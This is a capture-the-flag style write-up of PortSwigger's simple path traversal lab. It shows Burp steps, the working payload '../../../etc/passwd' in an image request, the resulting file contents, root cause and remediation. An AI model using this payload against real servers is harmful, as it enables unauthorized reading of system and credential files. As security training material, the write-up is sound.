# Lab 01 — File Path Traversal, Simple Case

[![Category](https://img.shields.io/badge/Category-Path%20Traversal-purple)]()
[![Type](https://img.shields.io/badge/Type-Path%20Traversal%20-%20No%20Sanitization-orange)]()
[![Severity](https://img.shields.io/badge/Severity-High-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/file-path-traversal)

> Part of the [Path Traversal Labs](./README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | File Path Traversal, Simple Case |
| **Vulnerability Class** | Path Traversal — No Sanitization |
| **Weakness (CWE)** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **Severity** | High |
| **Objective** | Retrieve the contents of /etc/passwd via the product image endpoint with no traversal defenses in place. |

## 2. Summary

The image-loading endpoint concatenates a user-supplied `filename` parameter directly onto a base directory with no validation or sanitization whatsoever, allowing classic `../` directory traversal sequences to escape the intended folder.

## 3. Proof of Concept (PoC)

**Step 1 — Capture the image request:**  
Browse any product page and intercept the image request in Burp:

```http
GET /image?filename=53.jpg HTTP/1.1
```

**Step 2 — Send to Repeater:**  
Forward the request to Burp Repeater (`Ctrl+R`).

**Step 3 — Inject the traversal payload:**  
Replace the filename value with a relative traversal sequence targeting a well-known system file:

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
```

**Step 4 — Confirm the read:**  
The response returns `200 OK` with the full contents of `/etc/passwd`, starting with `root:x:0:0:root:/root:/bin/bash`.


## 4. Evidence (Request / Response)

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: <lab-id>.web-security-academy.net

HTTP/1.1 200 OK
Content-Type: image/jpeg

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## 5. Root Cause Analysis

The backend builds the file path by naive string concatenation (`BASE_DIR + user_input`) and passes the result directly to a filesystem read API, with zero input validation. The `../` sequence is interpreted by the OS as "move up one directory," so enough repetitions walk the path back to the filesystem root before descending into the target file.

### Attacker vs. Defender Perspective

- **Attacker view:** Walk the path back to the filesystem root using ../ sequences to escape the intended directory and read arbitrary files.
- **Defender view:** Avoid passing user input to filesystem APIs; when unavoidable, validate strictly and canonicalize before any file operation.

## 6. Impact

Full arbitrary file read on the server's filesystem — exposing OS user accounts, application source code, configuration files, and potentially credentials for backend systems (databases, internal services), which can be chained into further compromise.

## 7. Remediation

- Avoid passing user-supplied input to filesystem APIs entirely where possible — use indirect references (database IDs, UUIDs) mapped server-side to actual file paths instead.
- If unavoidable, validate input against a strict allow-list (e.g. alphanumeric characters only, no path separators).
- After validation, resolve the canonical path (`File.getCanonicalPath()` or equivalent) and verify it still starts with the intended base directory before any file operation.

## 8. References

- [PortSwigger — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
